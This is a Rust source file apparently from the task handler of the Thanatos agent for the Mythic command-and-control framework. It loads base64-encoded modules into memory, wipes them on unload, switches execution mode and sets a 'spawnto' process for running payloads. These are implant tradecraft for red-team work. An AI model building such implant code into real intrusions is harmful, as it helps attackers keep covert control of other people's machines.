use std::sync::Arc;

use agent_utils::{
    cmddefs::ThanatosCommand,
    crypto::b64decode,
    errors::ThanatosError,
    msg::{MythicStatus, PendingTask, SpawnToValue, TaskResults},
};
use serde::Deserialize;

#[cfg(target_os = "linux")]
mod linux;

#[cfg(target_os = "windows")]
mod windows;

#[derive(Deserialize)]
struct LoadParams {
    name: ThanatosCommand,
    b64data: String,
    force_internal: bool,
    run_detached: bool,
}

#[derive(Deserialize)]
struct UnloadParams {
    command: ThanatosCommand,
}

#[derive(Deserialize)]
struct SpawnToParams {
    path: String,
    args: Option<String>,
}

#[derive(Deserialize)]
struct ExecutionMethodParams {
    method: String,
}

impl TryInto<LoadInfo> for LoadParams {
    type Error = ThanatosError;

    fn try_into(self) -> Result<LoadInfo, Self::Error> {
        Ok(LoadInfo {
            name: self.name,
            data: b64decode(self.b64data)?,
            force_internal: self.force_internal,
            detached: self.run_detached,
        })
    }
}

pub struct LoadInfo {
    name: ThanatosCommand,
    data: Vec<u8>,
    force_internal: bool,
    detached: bool,
}

impl crate::Tasker {
    pub fn load_command(&mut self, task: PendingTask) -> Result<TaskResults, ThanatosError> {
        let params: LoadParams =
            serde_json::from_str(&task.parameters).map_err(|_| ThanatosError::JsonDecodeError)?;

        if self
            .loaded_commands
            .iter()
            .find(|loaded| loaded.name == params.name)
            .is_some()
        {
            return Err(ThanatosError::CommandLoadedError);
        }

        self.loaded_commands.push(Arc::new(params.try_into()?));

        Ok(TaskResults {
            completed: true,
            ..Default::default()
        })
    }

    pub fn unload_command(&mut self, task: PendingTask) -> Result<TaskResults, ThanatosError> {
        let params: UnloadParams =
            serde_json::from_str(&task.parameters).map_err(|_| ThanatosError::JsonDecodeError)?;

        if let Some(command) = self
            .loaded_commands
            .iter_mut()
            .find(|loaded| loaded.name == params.command)
        {
            if let Some(command_inner) = Arc::get_mut(command) {
                command_inner.data.iter_mut().for_each(|x| *x = 0);
            }
        }

        self.loaded_commands
            .retain(|command| command.name != params.command);

        Ok(TaskResults {
            completed: true,
            ..Default::default()
        })
    }

    pub fn handle_executionmethod(
        &mut self,
        task: PendingTask,
    ) -> Result<TaskResults, ThanatosError> {
        let params: ExecutionMethodParams =
            serde_json::from_str(&task.parameters).map_err(|_| ThanatosError::JsonDecodeError)?;

        match params.method.as_str() {
            "internal" => {
                self.exec_internal = true;
            }
            "external" => {
                self.exec_internal = false;
            }
            _ => unreachable!(),
        }

        Ok(TaskResults {
            completed: true,
            ..Default::default()
        })
    }

    pub fn handle_spawnto(&mut self, task: PendingTask) -> Result<TaskResults, ThanatosError> {
        let params: SpawnToParams =
            serde_json::from_str(&task.parameters).map_err(|_| ThanatosError::JsonDecodeError)?;

        if !std::path::Path::new(&params.path).exists() {
            return Ok(TaskResults {
                completed: true,
                status: MythicStatus::Error,
                ..Default::default()
            });
        } else {
            self.spawnto = Some(SpawnToValue {
                path: params.path,
                args: params
                    .args
                    .unwrap_or_default()
                    .split(" ")
                    .map(|s| s.to_string())
                    .collect(),
            });

            return Ok(TaskResults {
                completed: true,
                ..Default::default()
            });
        }
    }
}
